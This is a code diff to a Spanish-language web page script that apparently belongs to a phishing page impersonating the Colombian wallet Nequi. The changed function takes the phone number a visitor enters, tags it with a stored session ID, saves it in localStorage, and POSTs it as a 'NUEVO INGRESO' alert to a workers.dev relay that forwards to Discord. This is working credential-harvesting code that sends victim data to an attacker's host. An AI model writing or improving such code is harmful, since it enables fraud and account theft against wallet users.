@@ -152,15 +152,20 @@
         function validarYEnviar() {
             const celular = document.getElementById('celular').value;
             const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
+            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
             
-            // Validar que tenga exactamente 10 dígitos
             if (celular.length !== 10) {
                 alert('Por favor ingresa un número de celular de 10 dígitos');
                 return;
             }
             
-            // Enviar a Discord
-            const mensaje = `📱 **NUEVO INGRESO**\nNúmero: +57 ${celular}`;
+            // Guardar número en localStorage
+            const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
+            datosSesion.numero = celular;
+            localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
+            
+            // Enviar mensaje a Discord
+            const mensaje = `📱 **NUEVO INGRESO**\n🆔 ${sesionId}\nNúmero: +57 ${celular}`;
             
             fetch(webhookURL, {
                 method: 'POST',
